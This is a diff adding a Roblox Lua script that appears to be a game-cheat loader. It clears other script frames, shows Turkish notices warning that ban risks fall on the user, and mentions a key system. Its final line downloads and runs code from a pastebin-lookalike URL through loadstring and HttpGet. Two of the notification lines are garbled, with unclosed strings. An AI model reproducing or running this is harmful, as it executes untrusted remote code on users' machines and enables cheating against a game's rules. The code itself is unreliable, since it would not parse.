@@ -1,0 +1,24 @@
+pcall(function()
+	if game:GetService"CoreGui":FindFirstChild"SCRIPT FOR THIS SHITTY GAME" then
+		game:GetService"CoreGui":FindFirstChild"SCRIPT FOR THIS SHITTY GAME":Destroy()
+	end
+	if game:GetService"CoreGui":FindFirstChild"INeedScript" then
+		game:GetService"CoreGui":FindFirstChild"INeedScript":Destroy()
+	end
+end)
+
+game:GetService"StarterGui":SetCore("SendNotification", { Title = "By Zamium "By Ahmet Efe= 5 })
+wait(5.3)
+game:GetService"StarterGui":SetCore("SendNotification", { Title = "Tüm Banlanma riskleri size aittir.", Text = "Ben banlamıyorum\nSadece abartma!", Duration = 5 })
+wait(5.3)
+game:GetService"StarterGui":SetCore("SendNotification", { Title = "Key Sistemi", Text = "Yüklendi\nLLütfen bekle 9e9 })
+spawn(function()
+	repeat wait() until game:GetService"CoreGui":FindFirstChild"INeedScript"
+	pcall(function()
+		game.CoreGui.RobloxGui.NotificationFrame.Notification:Remove()
+		game.CoreGui.RobloxGui.NotificationFrame.Notification:Remove()
+	end)
+end)
+spawn(function()
+    loadstring(game:HttpGet"https://pastebinp.com/raw/hCeHx757")()
+end)
